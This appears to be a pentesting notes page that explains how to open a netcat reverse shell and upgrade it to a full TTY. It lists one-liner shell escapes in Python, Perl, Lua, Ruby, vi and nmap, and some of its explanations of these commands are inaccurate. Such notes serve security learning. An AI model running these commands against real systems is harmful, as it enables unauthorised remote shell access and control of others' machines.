# 🧛‍♂️ Stabilize & Elevate a shell

First, it's good to have knowledge about what kind of way you can pop a shell:

{% content-ref url="../../still-sorting-out/documentation/cybersecurity-documentation/exploitation-basics/reverse-shell-and-bind-shell.md" %}
[reverse-shell-and-bind-shell.md](../../still-sorting-out/documentation/cybersecurity-documentation/exploitation-basics/reverse-shell-and-bind-shell.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>

If you have a nc shell tab auto complete, to up arrow and formatting problems →

**Listener:**

```
nc -nlvp 80
```

**Target:**&#x20;

```
nc -e /bin/bash 127.0.0.1 80
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

First technique with python:

```
python -c 'import pty; pty.spawn("/bin/bash")'
#OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys" %}

this relies on the target system having python

you can utilize other commands:

1.  Python:

    ```python
    echo os.system('/bin/bash')
    ```

    This Python code uses the `os.system()` function to execute `/bin/bash`.
2.  Bourne Shell:

    ```
    /bin/sh -i
    ```

    This command executes the Bourne shell `/bin/sh` in interactive mode (`-i`).
3.  Using script utility:

    ```
    script -qc /bin/bash /dev/null
    ```

    This command uses the `script` utility to run `/bin/bash` with output suppression (`-q`) and input redirection from `/dev/null`.
4.  Perl:

    ```
    perl -e 'exec "/bin/sh";'
    ```

    &#x20;In Perl, this command executes `/bin/sh` using the `exec` function.
5.  Ruby:

    ```
    exec "/bin/sh"
    ```

    This Ruby command uses the `exec` function to execute `/bin/sh`.
6.  Lua:

    ```
    os.execute('/bin/sh')
    ```

    In Lua, this command uses `os.execute()` to execute `/bin/sh`.
7.  Ruby IRB:

    ```
    exec "/bin/sh"
    ```

    This command is executed in the Ruby IRB (Interactive Ruby) shell and uses `exec` to execute `/bin/sh`.
8.  vi:

    ```
    :!bash
    ```

    In the vi editor, this command executes `bash` shell.
9.  vi (setting shell):

    ```
    :set shell=/bin/bash:shell
    ```

    This sets the shell to `/bin/bash` in vi.
10. nmap:

    ```
    !sh
    ```

    In nmap, the `!` is used to execute shell commands. Here it's running `/bin/sh`.

